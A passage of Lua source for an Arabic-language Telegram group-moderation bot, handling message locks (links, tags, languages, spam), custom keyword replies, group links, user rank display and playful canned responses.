              local chat = msg.chat_id_
              delete_msg(chat,msgs)
              print("Deleted [Lock] [Farsi] [Video] ")
            end
          end
          if msg.content_.caption_:match("[A-Z]") or msg.content_.caption_:match("[a-z]") then
            if database:get('bot:english:mute'..msg.chat_id_) then
              local id = msg.id_
              local msgs = {[0] = id}
              local chat = msg.chat_id_
              delete_msg(chat,msgs)
              print("Deleted [Lock] [English] [Video]")
            end
          end
        end
      end
      --Gif
      --Gif
      ------- --- Gif---------faeder
      -- -----------------Gif
      --Gif
      --Gif
    elseif msg_type == 'MSG:Gif' then
      if not is_vipmem(msg.sender_user_id_, msg.chat_id_) then
        if database:get('anti-flood:'..msg.chat_id_) then
          database:setex(pm, TIME_CHECK, msgs+1)
        end
        if msg.forward_info_ then
          if database:get('bot:forward:mute'..msg.chat_id_) then
            if msg.forward_info_.ID == "MessageForwardedFromUser" or msg.forward_info_.ID == "MessageForwardedPost" then
              local id = msg.id_
              local msgs = {[0] = id}
              local chat = msg.chat_id_
              delete_msg(chat,msgs)
              print("Deleted [Lock] [Fwd] [Gif]")
            end
          end
        end
        if database:get('bot:gifs:mute'..msg.chat_id_) then
          local id = msg.id_
          local msgs = {[0] = id}
          local chat = msg.chat_id_
          delete_msg(chat,msgs)
          print("Deleted [Lock] [Gif]")
        end
        if msg.content_.caption_ then
          check_filter_words(msg, msg.content_.caption_)
          if database:get('bot:links:mute'..msg.chat_id_) then
            if msg.content_.caption_:match("[Hh][Tt][Tt][Pp][Ss]://") or msg.content_.caption_:match("[Hh][Tt][Tt][Pp]://") then
              local id = msg.id_
              local msgs = {[0] = id}
              local chat = msg.chat_id_
              delete_msg(chat,msgs)
              print("Deleted [Lock] [Link] [Gif] ")
            end
          end
          if database:get('tags:lock'..msg.chat_id_) then
            if msg.content_.caption_:match("@") then
              local id = msg.id_
              local msgs = {[0] = id}
              local chat = msg.chat_id_
              delete_msg(chat,msgs)
              print("Deleted [Lock] [Tag] [Gif]")
            end
          end
          if msg.content_.caption_:match("#") then
            if database:get('bot:hashtag:mute'..msg.chat_id_) then
              local id = msg.id_
              local msgs = {[0] = id}
              local chat = msg.chat_id_
              delete_msg(chat,msgs)
              print("Deleted [Lock] [Hashtag] [Gif]")
            end
          end
          if msg.content_.caption_:match("[Hh][Tt][Tt][Pp][Ss]://") or msg.content_.caption_:match("[Hh][Tt][Tt][Pp]://") or msg.content_.caption_:match(".[Ii][Rr]") or msg.content_.caption_:match(".[Cc][Oo][Mm]") or msg.content_.caption_:match(".[Oo][Rr][Gg]") or msg.content_.caption_:match(".[Ii][Nn][Ff][Oo]") or msg.content_.caption_:match("[Ww][Ww][Ww].") or msg.content_.caption_:match(".[Tt][Kk]") then
            if database:get('bot:webpage:mute'..msg.chat_id_) then
              local id = msg.id_
              local msgs = {[0] = id}
              local chat = msg.chat_id_
              delete_msg(chat,msgs)
              print("Deleted [Lock] [Web] [Gif]")
            end
          end
          if msg.content_.caption_:match("[\216-\219][\128-\191]") then
            if database:get('bot:arabic:mute'..msg.chat_id_) then
              local id = msg.id_
              local msgs = {[0] = id}
              local chat = msg.chat_id_
              delete_msg(chat,msgs)
              print("Deleted [Lock] [Farsi] [Gif]")
            end
          end
          if msg.content_.caption_:match("[A-Z]") or msg.content_.caption_:match("[a-z]") then
            if database:get('bot:english:mute'..msg.chat_id_) then
              local id = msg.id_
              local msgs = {[0] = id}
              local chat = msg.chat_id_
              delete_msg(chat,msgs)
              print("Deleted [Lock] [English] [Gif]")
            end
          end
        end
      end
      --Text
      --Text
      ------- --- Text---------faeder
      -- -----------------Text
      --Text
      --Text
    elseif msg_type == 'MSG:Text' then
      if not is_vipmem(msg.sender_user_id_, msg.chat_id_) then
        if database:get('anti-flood:'..msg.chat_id_) then
          database:setex(pm, TIME_CHECK, msgs+1)
        end
      end
      --vardump(msg)
      if database:get("bot:group:link"..msg.chat_id_) == 'waiting' then
        if msg.content_.text_:match("(https://telegram.me/joinchat/%S+)") or msg.content_.text_:match("(https://t.me/joinchat/%S+)") then
          local glink = msg.content_.text_:match("(https://telegram.me/joinchat/%S+)") or msg.content_.text_:match("(https://t.me/joinchat/%S+)")
          local hash = "bot:group:link"..msg.chat_id_
          database:set(hash,glink)
          if database:get('lang:gp:'..msg.chat_id_) then
            faederdx(msg.chat_id_, msg.id_, 1, '🚦⁞ Group link has been saved ✅', 1, 'md')
          else
            faederdx(msg.chat_id_, msg.id_, 1, '🚦⁞ تم حفظ الرابط •', 1, 'md')
          end
        end
      end
      function check_username(extra,result,success)
        --vardump(result)
        local username = (result.username_ or '')
        local svuser = 'user:'..result.id_
        if username then
          database:hset(svuser, 'username', username)
        end
        if username and username:match("[Bb][Oo][Tt]$") or username:match("_[Bb][Oo][Tt]$") then
          if database:get('bot:bots:gkgk'..msg.chat_id_) and not is_momod(msg.chat_id_, msg.chat_id_) then
            local id = msg.id_
            local msgs = {[0] = id}
            local chat = msg.chat_id_
            delete_msg(chat,msgs)
            chat_kick(msg.chat_id_, msg.sender_user_id_)
            else
            chat_kick(msg.chat_id_, bots[i].user_id_)
            return false
          end
        end
      end
      getUser(msg.sender_user_id_,check_username)
      database:set('bot:editid'.. msg.id_,msg.content_.text_)
      if not is_free(msg, msg.content_.text_) then
        if not is_vipmem(msg.sender_user_id_, msg.chat_id_) then
          check_filter_words(msg,text)
          if text:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Mm][Ee]") or text:match("[Tt][Ll][Gg][Rr][Mm].[Mm][Ee]") or text:match("[Tt].[Mm][Ee]") then
            if database:get('bot:links:mute'..msg.chat_id_) then
              local id = msg.id_
              local msgs = {[0] = id}
              local chat = msg.chat_id_
              delete_msg(chat,msgs)
              print("Deleted [Lock] [Link] [Text]")
              if database:get('bot:strict'..msg.chat_id_) then
                chat_kick(msg.chat_id_, msg.sender_user_id_)
              end
            end
          end
          if database:get('bot:text:mute'..msg.chat_id_) then
            local id = msg.id_
            local msgs = {[0] = id}
            local chat = msg.chat_id_
            delete_msg(chat,msgs)
            print("Deleted [Lock] [Text]")
          end
          if msg.forward_info_ then
            if database:get('bot:forward:mute'..msg.chat_id_) then
              if msg.forward_info_.ID == "MessageForwardedFromUser" or msg.forward_info_.ID == "MessageForwardedPost" then
                local id = msg.id_
                local msgs = {[0] = id}
                local chat = msg.chat_id_
                delete_msg(chat,msgs)
                print("Deleted [Lock] [Fwd] [Text]")
              end
            end
          end
          if msg.content_.text_:match("@") then
            if database:get('tags:lock'..msg.chat_id_) then
              local id = msg.id_
              local msgs = {[0] = id}
              local chat = msg.chat_id_
              delete_msg(chat,msgs)
              print("Deleted [Lock] [Tag] [Text]")
            end
          end
          if msg.content_.text_:match("#") then
            if database:get('bot:hashtag:mute'..msg.chat_id_) then
              local id = msg.id_
              local msgs = {[0] = id}
              local chat = msg.chat_id_
              delete_msg(chat,msgs)
              print("Deleted [Lock] [Hashtag] [Text]")
            end
          end
          if text:match("[Hh][Tt][Tt][Pp][Ss]://") or text:match("[Hh][Tt][Tt][Pp]://") or text:match(".[Ii][Rr]") or text:match(".[Cc][Oo][Mm]") or text:match(".[Oo][Rr][Gg]") or text:match(".[Ii][Nn][Ff][Oo]") or text:match("[Ww][Ww][Ww].") or text:match(".[Tt][Kk]") or msg.content_.ID == "MessageEntityTextUrl" or msg.content_.ID == "MessageEntityUrl" then
            if database:get('bot:webpage:mute'..msg.chat_id_) then
              local id = msg.id_
              local msgs = {[0] = id}
              local chat = msg.chat_id_
              delete_msg(chat,msgs)
              print("Deleted [Lock] [Web] [Text]")
            end
          end
          if msg.content_.text_:match("[\216-\219][\128-\191]") then
            if database:get('bot:arabic:mute'..msg.chat_id_) then
              local id = msg.id_
              local msgs = {[0] = id}
              local chat = msg.chat_id_
              delete_msg(chat,msgs)
              print("Deleted [Lock] [Farsi] [Text]")
            end
          end
          if msg.content_.text_ then
            local _nl, ctrl_chars = string.gsub(text, '%c', '')
            local _nl, real_digits = string.gsub(text, '%d', '')
            local id = msg.id_
            local msgs = {[0] = id}
            local chat = msg.chat_id_
            local hash = 'bot:sens:spam'..msg.chat_id_
            if not database:get(hash) then
              sens = 400
            else
              sens = tonumber(database:get(hash))
            end
            if database:get('bot:spam:mute'..msg.chat_id_) and string.len(msg.content_.text_) > (sens) or ctrl_chars > (sens) or real_digits > (sens) then
              delete_msg(chat,msgs)
              print("Deleted [Lock] [Spam] ")
            end
          end
          if msg.content_.text_:match("[A-Z]") or msg.content_.text_:match("[a-z]") then
            if database:get('bot:english:mute'..msg.chat_id_) then
              local id = msg.id_
              local msgs = {[0] = id}
              local chat = msg.chat_id_
              delete_msg(chat,msgs)
              print("Deleted [Lock] [English] [Text]")
            end
          end
        end
      end
      -------------faeder
      if text then 
local test =  database:get("bot:add:repallt"..msg.sender_user_id_..bot_id)    
if test and test == 'yes11' then
     faederdx(msg.chat_id_, msg.id_, 1, '🚦⁞ تم حذف الرد •', 1, 'md')   
database:del("bot:add:repallt"..msg.sender_user_id_..bot_id) 
 database:del("bot:add:repallt:gif:all"..text..bot_id)    
database:del("bot:add:rep:tvico:all"..text..bot_id)  
database:del("bot:add:rep:tstekr:all"..text..bot_id) 
 database:del("bot:add:rep:text:all"..text..bot_id)    
database:srem("rep:media:all"..bot_id,text) 
   return false    
end   
 end
      -----------------------------------------------faeder--------------------------------------------------------
      if text  or (data.message_.content_.sticker_ or data.message_.content_.voice_ or data.message_.content_.animation_) then  
  local test = database:get("bot:add:repallt"..msg.sender_user_id_..bot_id)   
 if test == 'yes1' then   
 faederdx(msg.chat_id_, msg.id_, 1, '🚦⁞ تم حفظ الرد •', 1, 'md') 
   database:del("bot:add:repallt"..msg.sender_user_id_..bot_id)    
local test = database:get("bot:addreply2:"..msg.sender_user_id_..bot_id)  
  if data.message_.content_.sticker_ then     
  database:set("bot:add:rep:tstekr:all"..test..bot_id, data.message_.content_.sticker_.sticker_.persistent_id_)
    end     
if data.message_.content_.voice_ then  
 database:set("bot:add:rep:tvico:all"..test..bot_id, data.message_.content_.voice_.voice_.persistent_id_)    
end   
  if data.message_.content_.animation_ then    
   database:set("bot:add:repallt:gif:all"..test..bot_id, data.message_.content_.animation_.animation_.persistent_id_)  
  end   
 if text then   
    database:set("bot:add:rep:text:all"..test..bot_id, text) 
   end    
  database:del("bot:addreply2:"..msg.sender_user_id_..bot_id)   
 return false   
 end 
   end
      ----------------------------------------faeder---------------------------------------------------------------
      if msg.content_ then
if database:get('dell_replay:'..msg.sender_user_id_) then 
database:del('dell_replay:'..msg.sender_user_id_)
if not database:hget('replay:'..msg.chat_id_,msg.content_.text_) then
faederdx(msg.chat_id_, msg.id_, 1,'🏷⁞ لا يوجد رد بهذه الكلمه ☑️',  1, "html")
else
database:hdel('replay:'..msg.chat_id_,msg.content_.text_)
faederdx(msg.chat_id_, msg.id_, 1,'🚦⁞ الكلمه *('..msg.content_.text_..')*\n تم مسح ردها ☑️',  1, "md")
return false
end
end 
      ---------------------------------------------faeder----------------------------------------------------------

      ---------------------------******** END MSG CHECKS FAEDER********--------------------------------------------
      if database:get("bot:support:link" .. msg.sender_user_id_) then
          if msg.content_.text_:match("(https://telegram.me/joinchat/%S+)") or msg.content_.text_:match("(https://t.me/joinchat/%S+)") then
            local glink = msg.content_.text_:match("(https://telegram.me/joinchat/%S+)") or msg.content_.text_:match("(https://t.me/joinchat/%S+)")
            local hash = "bot:supports:link"
            database:set(hash, glink)
            if database:get("lang:gp:" .. msg.chat_id_) then
              faederdx(msg.chat_id_, msg.id_, 1, "🚦⁞  *Support link has been Saved*  •", 1, "md")
            else
              faederdx(msg.chat_id_, msg.id_, 1, "🚦⁞ تم حفض رابط كروب الدعم •", 1, "md")
            end
            database:del("bot:support:link" .. msg.sender_user_id_)
          elseif msg.content_.text_:match("^@(.*)[Bb][Oo][Tt]$") or msg.content_.text_:match("^@(.*)_[Bb][Oo][Tt]$") then
            local bID = msg.content_.text_:match("@(.*)")
            local hash = "bot:supports:link"
            database:set(hash, bID)
            if database:get("lang:gp:" .. msg.chat_id_) then
              faederdx(msg.chat_id_, msg.id_, 1, "🚦⁞ *Support Bot ID* has been *Saved* •", 1, "md")
            else
              faederdx(msg.chat_id_, msg.id_, 1, "🚦⁞ تم حفض معرف الدعم •", 1, "md")
            end
            database:del("bot:support:link" .. msg.sender_user_id_)
          end
        end
        ---------------------------------------------faeder----------------------------------------------------------
        if database:get("bot:nerkh" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) then
          database:del("bot:nerkh" .. msg.chat_id_ .. ":" .. msg.sender_user_id_)
          local nerkh = msg.content_.text_:match("(.*)")
          database:set("nerkh", nerkh)
          if database:get("lang:gp:" .. msg.chat_id_) then
            faederdx(msg.chat_id_, msg.id_, 1, "🚦⁞ Bot *sudo* has been *Setted* •", 1, "md")
          else
            faederdx(msg.chat_id_, msg.id_, 1, "🎖 ⁞ تم حفظ كليشه المطور •", 1, "md")
          end
        end
      ----------------------------------------faeder---------------------------------------------------------------
      if database:get('bot:cmds'..msg.chat_id_) and not is_momod(msg.sender_user_id_, msg.chat_id_) then
        print("Return False [Lock] [Cmd]")
        return false
      else
      --------------------------------------faeder
      if text == 'دي' or text == 'دي لك' then 
if not database:get('bot:rep:mute'..msg.chat_id_) then
faeder =  "يـٰ̲ـہمـٰ̲ـہشـٰ̲ـہوٰكـٰ̲ـہ بـٰ̲ـہيـٰ̲ـہهـٰ̲ـہاٰ حـٰ̲ـہيـٰ̲ـہوٰاٰنـٰ̲ـہ ♯⋮ֆ🗡🦁"
else 
faeder = ''
end
faederdx(msg.chat_id_, msg.id_, 1, faeder, 1, 'md')
end
if text == 'سلام' or text == 'السلام عليكم' or text == 'سلام عليكم' then 
if not database:get('bot:rep:mute'..msg.chat_id_) then
faeder =  "عٰہٰٖلہٰٖيٰہٰٖكٰہٰٖمٰہٰٖ اٰلہٰٖسٰہٰٖلہٰٖاٰمٰہٰٖ اٰغٰہٰٖاٰتٰہٰٖيٰہٰٖ ❊😼🎶ֆ"
else 
faeder = ''
end
faederdx(msg.chat_id_, msg.id_, 1, faeder, 1, 'md')
end
if text == '😭💔' or text == '😭😭' or text == '😭😭😭' or text == '😿💔' or text == '💔😭' or text == '😭😭😭' or text == '😭😭😭😭' then      
if not database:get('bot:rep:mute'..msg.chat_id_) then
faeder =  "لتَہَٰبّہجْۧيِٰہ حہٰٰيِٰہآتَہَٰيِٰہ ف͒ہٰٰديِٰہتَہَٰڪٰྀہٰٰٖ ║😿 ₍♚⁾🔥"
else 
faeder = ''
end 
faederdx(msg.chat_id_, msg.id_, 1, faeder, 1, 'md')
end
if text == '🌚💔' or text == '💔🌚' or text == '🚶‍♂💔' or text == '💔' or text == '😔💔' or text == '🚶‍♀💔' or text == '😭' then      
if not database:get('bot:rep:mute'..msg.chat_id_) then
faeder =  "تَہَٰ؏ۤـہآل آشِٰہٰٰڪٰྀہٰٰٖيِٰہليِٰہ ٰ̲ھہمٰ̲ہوِمٰ̲ہڪٰྀہٰٰٖ ⁞✦⁽😭🔥₎“ٰۦ"
else 
faeder = ''
end 
faederdx(msg.chat_id_, msg.id_, 1, faeder, 1, 'md')
end
if text == 'باي' or text == 'بااي' or text == 'اروح' or text == 'اروح احسن' or text == 'اولي احسن' or text == 'راح اروح' or text == 'باي انام' then      
if not database:get('bot:rep:mute'..msg.chat_id_) then
faeder =  "خ̲ـꨩﮧلٍُـّٰ̐ہيـِٰ̲ﮧكـِّﮧْٰٖ دٰཻا ཻاضـٰ๋۪͜ﮧٰح̲ꪳـﮧكـِّﮧْٰٖ عـ͜ާﮧْلٍُـّٰ̐ہيـِٰ̲ﮧكـِّﮧْٰٖ ⩩ཻ🌞ֆ﴾"
else 
faeder = ''
end 
faederdx(msg.chat_id_, msg.id_, 1, faeder, 1, 'md')
end
if text == 'هلو' or text == 'هلاو' or text == 'هلا' or text == 'هلاوو' or text == 'هيلاو' or text == 'هيلاوو' or text == 'هلاا' then      
if not database:get('bot:rep:mute'..msg.chat_id_) then
faeder =  "♛#ֆ‘﴾ۗ ʟ̤ɾʅ᎗̣ɹᓗ ᎗̈ɹȊg⅃᎗බ"
else 
faeder = ''
end 
faederdx(msg.chat_id_, msg.id_, 1, faeder, 1, 'md')
end
if text == 'شونك' or text == 'شونج' or text == 'شلونك' or text == 'شلونج' or text == 'شونكم' or text == 'شلونكم' or text == 'شلخبار' then      
if not database:get('bot:rep:mute'..msg.chat_id_) then
faeder =  "آنَِٰہيِٰہ تَہَٰمٰ̲ہآمٰ̲ہ آنَِٰہتَہَٰ شِٰہٰٰلوِنَِٰہڪٰྀہٰٰٖ  ⁽࿑♚꫶😼ֆ﴾"
else 
faeder = ''
end 
faederdx(msg.chat_id_, msg.id_, 1, faeder, 1, 'md')
end
if text == 'وينك' or text == 'وينج' then 
if not database:get('bot:rep:mute'..msg.chat_id_) then
faeder =  "عـٰ̲ـہوٰفـٰ̲ـہنـٰ̲ـہيـٰ̲ـہ جـٰ̲ـہاٰيـٰ̲ـہ اٰزٰحـٰ̲ـہفـٰ̲ـہ 🐼⚡️ֆ‘﴾"
else 
faeder = ''
end 
faederdx(msg.chat_id_, msg.id_, 1, faeder, 1, 'md')
end
if text == 'نايمين' or text == 'ميتين' then 
if not database:get('bot:rep:mute'..msg.chat_id_) then
faeder =  "آنَِٰہيِٰہ ڪٰྀہٰٰٖآ؏ۤـہد آحہٰٰرسٰٰٓڪٰྀہٰٰٖمٰ̲ہ ℡̮⇣┆👑😻⇣ۦ"
else 
faeder = ''
end 
faederdx(msg.chat_id_, msg.id_, 1, faeder, 1, 'md')
end
if text == 'اكلك' or text == 'اكلج' then 
if not database:get('bot:rep:mute'..msg.chat_id_) then
faeder =  "ཻاٰ̲ھہﯛ૭ ب̲ꪰـﮧدٰتـٰۧﮧ ཻالٍُـّٰ̐ہكـِّﮧْٰٖرٰཻاﯛ૭يـِٰ̲ﮧ ཻالٍُـّٰ̐ہتـٰۧﮧعـ͜ާﮧْب̲ꪰـﮧཻانٰ̲̐ـﮧْٰ̲ھہ 卍🙃♛⁽ ֆ ̯͡“"
else 
faeder = ''
end 
faederdx(msg.chat_id_, msg.id_, 1, faeder, 1, 'md')
end
if text == 'ها' or text == 'هاا' then 
if not database:get('bot:rep:mute'..msg.chat_id_) then
faeder =  "ۿۿہآ رديِٰـﮧِۢنِٰـﮧِۢۿۿہ لِٰـِﮧۢﯛ̲୭ لِٰـِﮧۢآ ₎⇣🌚🔥 ⁞₎⇣"
else 
faeder = ''
end
faederdx(msg.chat_id_, msg.id_, 1, faeder, 1, 'md')
end
if text == 'سورس فايدر' or text == 'هذا سورس فايدر' then 
if not database:get('bot:rep:mute'..msg.chat_id_) then
faeder =  "لآ سٰٰٓوِرسٰٰٓ خٰ̐ہآلتَہَٰڪٰྀہٰٰٖ ديِٰہ لڪٰྀہٰٰٖ ┋՞❁ 🌞?? ﴾"
else 
faeder = ''
end
faederdx(msg.chat_id_, msg.id_, 1, faeder, 1, 'md')
end
if text == 'فايدر' or text == 'وين فايدر' then 
if not database:get('bot:rep:mute'..msg.chat_id_) then
faeder =  "؏ۤـہوِف͒ہٰٰ مٰ̲ہطۨہٰٰوِريِٰہ مٰ̲ہآ ف͒ہٰٰآرغہٰٰلڪٰྀہٰٰٖ ┊ާ͢🌚🔥₎⇣"
else 
faeder = ''
end
faederdx(msg.chat_id_, msg.id_, 1, faeder, 1, 'md')
end
if text == 'بوت' or text == 'هذا بوت' then 
if not database:get('bot:rep:mute'..msg.chat_id_) then
faeder =  "؏ۤـہيِٰہوِنَِٰہٰ̲ھہ آل؏ۤـہسٰٰٓليِٰہآتَہَٰ ❊😼🎶ֆ"
else 
faeder = ''
end
faederdx(msg.chat_id_, msg.id_, 1, faeder, 1, 'md')
end
----------------
      if msg.content_ then
if database:get('dell_replay:'..msg.sender_user_id_) then 
database:del('dell_replay:'..msg.sender_user_id_)
if not database:hget('replay:'..msg.chat_id_,msg.content_.text_) then
faederdx(msg.chat_id_, msg.id_, 1,'🏷⁞ لا يوجد رد بهذه الكلمه ☑️',  1, "html")
else
database:hdel('replay:'..msg.chat_id_,msg.content_.text_)
faederdx(msg.chat_id_, msg.id_, 1,'🚦⁞ الكلمه *('..msg.content_.text_..')*\n تم مسح ردها ☑️',  1, "md")
return false
end
end 
------------------------------------------------------------------------------faeder
if database:get('add_replay:'..msg.sender_user_id_) then 
if not database:get('replay1'..msg.sender_user_id_) then 
database:setex('replay1'..msg.sender_user_id_,500,msg.content_.text_)
faederdx(msg.chat_id_, msg.id_, 1, "🚦⁞ حسننا ارسل لي الرد الان 📬" ,  1, "md")
return false
end
if database:get('replay1'..msg.sender_user_id_) then 
database:hset('replay:'..msg.chat_id_, database:get("replay1"..msg.sender_user_id_), msg.content_.text_)
database:del('add_replay:'..msg.sender_user_id_)
faederdx(msg.chat_id_, msg.id_, 1,'🚦⁞ الكلمه *('..msg.content_.text_..')*\n تم حفظ الرد ☑️',  1, "md")
database:del("replay1"..msg.sender_user_id_)
return false
end 
end
----------------------------------------------------------------------------------faeder
if is_momod(msg.sender_user_id_, msg.chat_id_) and idf:match("-100(%d+)") then
if msg.content_.text_:match("^اضف رد$") then
database:setex('add_replay:'..msg.sender_user_id_,500 , true)
database:del('q_replay:'..msg.sender_user_id_)
faederdx(msg.chat_id_, msg.id_, 1, "🚦⁞ حسننا ارسل لي الكلمه الان 📬" ,  1, "md")
return false
end
end
--------------------------------------------------------------------------faeder
if is_momod(msg.sender_user_id_, msg.chat_id_) and idf:match("-100(%d+)") then
if msg.content_.text_:match("^حذف رد$") then
database:setex('dell_replay:'..msg.sender_user_id_,500 , true)
faederdx(msg.chat_id_, msg.id_, 1, "🚦⁞ حسننا ارسل لي كلمه الرد التي تريد مسحها 📬" ,  1, "md")
return false
end
end
----------------------------------------------------------------------------------faeder
if is_momod(msg.sender_user_id_, msg.chat_id_) and idf:match("-100(%d+)") then
if msg.content_.text_:match("^حذف الردود$") then
local rrrd = database:hkeys('replay:'..msg.chat_id_)
if #rrrd==0 then
faederdx(msg.chat_id_, msg.id_, 1, "🚦⁞ لا توجد ردود مضافه 🏷" ,  1, "md")
else
for i=1, #rrrd do 
database:hdel('replay:'..msg.chat_id_,rrrd[i])
 end
end
faederdx(msg.chat_id_, msg.id_, 1, "🚦⁞ تم حذف جميع الردود ☑️" ,  1, "md")
return false
end
end
------------------------------------------------------------------------------------faeder
if is_momod(msg.sender_user_id_, msg.chat_id_) and idf:match("-100(%d+)") then
if msg.content_.text_:match("^الردود$") then
local rrrd = database:hkeys('replay:'..msg.chat_id_)
if #rrrd == 0 then 
faederdx(msg.chat_id_, msg.id_, 1, "🚦⁞ لا توجد ردود مضافه 🏷" ,  1, "md")
else
local i = 1
local message = '🚦⁞ الردود •\n'
for i=1, #rrrd do 
message = message ..i..' ~ (['..rrrd[i]..']) \n'
 i = i + 1 
end  
faederdx(msg.chat_id_, msg.id_, 1, message,1, "md")
end
return false
end
end
-----------------------------------------------------------------------------------------faeder
if msg.content_.text_ then
if database:hget('replay:'..msg.chat_id_, msg.content_.text_) then
faederdx(msg.chat_id_,msg.id_,1,database:hget('replay:'..msg.chat_id_, msg.content_.text_),  1, "md")
end
end
if msg.content_.text_ then
if database:hget('add:repallt:'..msg.chat_id_, msg.content_.text_) then
faederdx(msg.chat_id_,msg.id_,1,database:hget('add:repallt:'..msg.chat_id_, msg.content_.text_),  1, "md")
end
end
        ------------------------------------ With Pattern faeder-------------------------------------------
        if text:match("^[Ll]ink$") or text:match("^الرابط$") then
            local link = database:get("bot:group:link"..msg.chat_id_)
            if link then
              if database:get('lang:gp:'..msg.chat_id_) then
                faederdx(msg.chat_id_, msg.id_, 1, "🚦⁞ Group link 📬  • \n " .. link, 1, "html")
              else
                faederdx(msg.chat_id_, msg.id_, 1, "🚦⁞ رابط المجموعه 📬  • \n " .. link, 1, "html")
              end
            else
              if database:get('lang:gp:'..msg.chat_id_) then
                faederdx(msg.chat_id_, msg.id_, 1, '🚦⁞ Group link is not set ! \n Plese send command Setlink and set it  •', 1, 'md')
              else
                faederdx(msg.chat_id_, msg.id_, 1, '🚦⁞ لم يتم حفظ رابط المجموعه ارسل لي (ضع رابط) ليتم حفظه 📥', 1, 'md')
              end
            end
          end
        end
        ----------faeder
        if text == 'رفع المشرفين' then  
local function promote_admin(extra, result, success)  
local num = 0
local admins = result.members_  
for i=0 , #admins do   
num = num + 1
database:sadd('bot:momod:'..msg.chat_id_, admins[i].user_id_)   
if result.members_[i].status_.ID == "ChatMemberStatusCreator" then  
owner_id = admins[i].user_id_  
database:sadd('bot:monsh:'..msg.chat_id_,owner_id)   
end  
end  
faederdx(msg.chat_id_, msg.id_, 1, '\n*🚦⁞ تم رفع «'..num..'» ادمنيه هنا •\n🚏⁞ وتم رفع منشئ المجموعه •*', 1, 'md')
end
getChannelMembers(msg.chat_id_,0, 'Administrators', 100, promote_admin)
end
-------------faeder
        if is_momod(msg.sender_user_id_, msg.chat_id_) then
          if text:match("^[Pp]ing$") or text:match("^فحص$") then
            if database:get('lang:gp:'..msg.chat_id_) then
              faederdx(msg.chat_id_, msg.id_, 1, '🚦⁞ Bot is now Online •', 1, 'md')
            else
              faederdx(msg.chat_id_, msg.id_, 1, '🚦⁞ البوت شغال عزيزي • ', 1, 'md')
            end
          end
        end
        if text:match("^تاك (.*)$")  then
          local txt = {string.match(text, "^(تاك) (.*)$")}
          faederdx(msg.chat_id_,0, 1, txt[2], 1, 'md')
          local id = msg.id_
          local msgs = {[0] = id}
          local chat = msg.chat_id_
        end
        ------------------------------------faeder-----------------------------------------------------------
        if is_admin(msg.sender_user_id_, msg.chat_id_) then
          if text:match("^[Ll]eave$") or text:match("^غادر$") then
            chat_leave(msg.chat_id_, bot_id)
            database:srem("bot:groups",msg.chat_id_)
            faederdx(msg.chat_id_, msg.id_, 1, '🚦⁞ طبكم مرض راح اغادر باي •', 1, 'md')
          end
        end
        --------------faeder
        if text:match("^موقعي$") or text:match("^[Mm]e$") or text:match("^رتبتي$") then
          function get_me(extra,result,success)
            if is_leaderid(result.id_) then
              ten = 'Chief'
              tar = 'مطور اساسي'
            elseif is_sudoid(result.id_) then
              ten = 'Sudo'
              tar = 'مطور ثانوي'
            elseif is_admin(result.id_) then
              ten = 'sudo3'
              tar = 'مطور رتبه ثالثه'
              elseif is_onall(result.id_) then
              ten = 'owner all'
              tar = 'مدير عام'
              elseif is_moall(result.id_) then
              ten = 'modod all'
              tar = 'ادمن عام'
              elseif is_vpall(result.id_) then
              ten = 'vip all'
              tar = 'مميز عام'
              elseif is_monsh(result.id_, msg.chat_id_) then
              ten = 'monsh'
              tar = 'منشئ'
              elseif is_donky(result.id_, msg.chat_id_) then
              ten = 'Full donky'
              tar = 'مطي فول مواصفات 😹😔'
            elseif is_owner(result.id_, msg.chat_id_) then
              ten = 'Owner'
              tar = 'مدير البوت'
            elseif is_momod(result.id_, msg.chat_id_) then
              ten = '*Group Admin*'
              tar = 'ادمن البوت'
            else
              ten = 'Member'
              tar = 'عضو جايف'
            end
            if result.username_ then
              username = '@'..result.username_
            else
              if database:get('lang:gp:'..msg.chat_id_) then
                username = 'Not Found'
              else
                username = 'لا يوجد'
              end
            end
            if result.last_name_ then
              lastname = result.last_name_
            else
              lastname = ''
            end
            if database:get('lang:gp:'..msg.chat_id_) then
              faederdx(msg.chat_id_, msg.id_, 1, '🚦⁞ Your name • '..result.first_name_..' '..lastname..' •\n🎖⁞ Your user • '..username..' •\n🚦⁞ Your ID • '..result.id_..' •\n📚⁞ Your Rank • '..ten, 1, 'html')
            else
              faederdx(msg.chat_id_, msg.id_, 1, '🚦⁞ اسمك • '..result.first_name_..' '..lastname..' •\n🎖⁞ معرفك • '..username..' •\n🚦⁞ ايديك • '..result.id_..' •\n📚⁞ موقعك • '..tar, 1, 'html')
            end
          end
          getUser(msg.sender_user_id_,get_me)
        end
        if text:match("^معلوماتي$") or text:match("^[Ii]nfo$") then
          function get_me(extra,result,success)
            if is_leaderid(result.id_) then
              ten = 'Chief'
              tar = 'مطور اساسي'
            elseif is_sudoid(result.id_) then
              ten = 'Sudo'
              tar = 'مطور ثانوي'
            elseif is_admin(result.id_) then
              ten = 'sudo3'
              tar = 'مطور رتبه ثالثه'
            elseif is_owner(result.id_, msg.chat_id_) then
              ten = 'Owner'
              tar = 'مدير البوت'
            elseif is_momod(result.id_, msg.chat_id_) then
              ten = '*Group Admin*'
              tar = 'ادمن البوت'
            else
              ten = 'Member'
              tar = 'عضو جايف'
            end
            if result.username_ then
              username = '@'..result.username_
            else
              if database:get('lang:gp:'..msg.chat_id_) then
                username = 'Not Found'
              else
                username = 'لا يوجد'
              end
            end
            if result.last_name_ then
              lastname = result.last_name_
            else
              lastname = ''
            end
            if database:get('lang:gp:'..msg.chat_id_) then
              faederdx(msg.chat_id_, msg.id_, 1, '🚦⁞ Your name • '..result.first_name_..' '..lastname..' •\n🎖⁞ Your user • '..username..' •\n📖⁞ Your ID • '..result.id_..' •\n📚⁞ Your Rank • '..ten, 1, 'html')
            else
              faederdx(msg.chat_id_, msg.id_, 1, '🚦⁞ اسمك • '..result.first_name_..' '..lastname..' •\n🎖⁞ معرفك • '..username..' •\n📖⁞ ايديك • '..result.id_..' •\n📚⁞ موقعك • '..tar, 1, 'html')
            end
          end
          getUser(msg.sender_user_id_,get_me)
        end
        -----------------------faeder
        if text:match("^(time)$") or text:match("^(الوقت)$")  then
  local url , res = https.request('https://sajad.gq/api/date/')
  if res ~= 200 then return end
  local jd = json:decode(url)
  faeder = "📅 ⁞ التاريخ • "..jd.EnDate.WordOne.."\n🕐 ⁞ الساعه • "..jd.EnTime.Number..""
  faederdx(msg.chat_id_, msg.id_, 1, faeder, 1, 'md')
 end
